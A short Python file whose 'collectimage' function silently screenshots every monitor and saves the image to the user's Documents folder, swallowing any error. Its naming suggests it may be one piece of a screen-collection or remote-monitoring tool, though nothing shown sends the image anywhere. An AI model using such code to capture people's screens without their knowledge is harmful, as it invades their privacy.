from  mss import mss
import os

screen = mss()


def collectimage():
    try:
        path = os.path.expandvars("%userprofile%") +'\\Documents\\'
        screen.shot(mon=-1, output=(path + 'tempic.png'))
        
        return True

    except:
        return False    

            
    